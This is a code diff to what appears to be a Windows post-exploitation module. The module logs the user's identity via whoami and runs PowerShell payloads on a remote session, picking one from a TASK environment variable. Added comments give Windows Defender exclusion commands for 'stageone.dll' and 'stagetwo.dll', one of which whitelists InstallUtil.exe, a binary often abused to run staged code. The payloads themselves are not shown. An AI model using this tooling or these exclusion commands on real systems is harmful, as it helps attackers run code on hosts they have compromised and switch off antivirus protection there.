@@ -13,6 +13,10 @@ import tarfile
 import base64
 from datetime import datetime
 
+# necessary exclusions for windows defender:
+# stageone.dll: Add-MPPreference -ExclusionPath "C:\Windows\Tasks\"
+# stagetwo.dll: Add-MPPreference -ExclusionProcess "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe"
+
 
 class Module(BaseModule):
     PLATFORM = [Windows]
@@ -64,11 +68,12 @@ class Module(BaseModule):
 
             script_dir = os.path.dirname(os.path.realpath(__file__))
             session.log(f"script dir: {script_dir}")
-            # task_name = session.platform.getenv("TASK")
-            # if task_name is None:
-            #     task_name = "default_payload"
-            # session.log(f"task environment: {task_name}")
-            task_name = "default_payload"
+            # on windows if name isn't in the env array we get an exception
+            try:
+                task_name = session.platform.getenv("TASK")
+            except:
+                task_name = "default"
+            session.log(f"task environment: {task_name}")
 
             # create work directory
             session.log(f"creating task directory: /{task_name}")
@@ -84,12 +89,15 @@ class Module(BaseModule):
             result = session.platform.whoami()
             session.log(f"whoami: {json.dumps(result, indent=4)}")
 
-            session.log(f"running default payload...")
-            windows_default_payload = Path(
-                f"{script_dir}/../resources/windows_default_payload.ps1")
-            payload = windows_default_payload.read_text()
-            result = run_remote(session, payload)
-            session.log(json.dumps(result, indent=4))
+            if task_name == "touch_file":
+                windows_default_payload = Path(
+                    f"{script_dir}/../resources/touch_file.ps1")
+                payload = windows_default_payload.read_text()
+                result = run_remote(session, payload)
+                session.log(json.dumps(result, indent=4))
+            else:
+                result = run_remote(session, default_payload)
+                session.log(json.dumps(result, indent=4))
 
             session.log("Removing sesssion lock...")
             if session_lock.exists():
